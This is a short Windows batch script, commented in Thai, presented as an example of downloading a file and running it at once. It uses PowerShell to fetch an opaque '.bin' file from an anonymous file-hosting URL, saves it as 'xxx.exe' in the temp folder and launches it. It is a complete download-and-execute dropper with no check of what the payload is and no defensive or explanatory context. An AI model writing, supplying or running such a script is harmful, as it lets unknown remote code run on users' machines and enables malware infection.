@echo off
:: ตัวอย่าง BAT ดาวน์โหลดไฟล์แล้วรันเลย

:: ตั้งชื่อไฟล์และ URL ที่ต้องการดาวน์โหลด
set "URL=https://files.catbox.moe/l4d2c1.bin"
set "FILENAME=xxx.exe"

:: โฟลเดอร์ชั่วคราว (หรือจะเปลี่ยนเป็นที่อื่นก็ได้)
set "TEMPFILE=%TEMP%\%FILENAME%"

echo กำลังดาวน์โหลด %FILENAME% ...
:: ใช้ PowerShell ดาวน์โหลด (วิธีที่เสถียรที่สุดใน Windows ปัจจุบัน)
powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%TEMPFILE%'"

:: ตรวจสอบว่าดาวน์โหลดสำเร็จไหม
if exist "%TEMPFILE%" (
    echo ดาวน์โหลดเสร็จสิ้น! กำลังรันไฟล์...
    start "" "%TEMPFILE%"
) else (
    echo ดาวน์โหลดไม่สำเร็จ กรุณาตรวจสอบ URL
    pause
)

exit